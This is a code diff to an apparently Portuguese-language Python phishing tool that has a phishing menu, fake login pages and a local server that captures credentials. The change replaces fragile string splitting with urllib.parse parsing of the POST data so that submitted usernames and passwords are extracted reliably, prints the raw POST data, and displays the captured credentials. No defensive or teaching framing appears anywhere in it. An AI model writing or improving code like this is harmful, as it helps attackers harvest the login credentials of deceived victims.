@@ -8,6 +8,7 @@ import time
 import webbrowser
 import requests
 from bs4 import BeautifulSoup
+import urllib.parse
 from colorama import init, Fore, Style
 
 # Função para limpar a tela do console
@@ -231,8 +232,6 @@ def phishing_menu(language):
         else:
             handle_invalid_option(language)
 
-
-# Função para as páginas de logins falsas
 # Função para as páginas de logins falsas
 def fake_login_pages(language):
     clear_console()
@@ -324,8 +323,14 @@ def run_local_server(target_url, language):
             # Capturar dados do formulário POST
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length).decode('utf-8')
-            username = post_data.split('&')[0].split('=')[1]
-            password = post_data.split('&')[1].split('=')[1]
+
+            # Adicionar depuração para verificar os dados recebidos
+            print("Received POST data:", post_data)
+
+            # Analisar os dados POST para extrair credenciais
+            post_params = urllib.parse.parse_qs(post_data)
+            username = post_params.get('username', [''])[0]
+            password = post_params.get('password', [''])[0]
 
             # Exibir credenciais no console
             if language == '1':
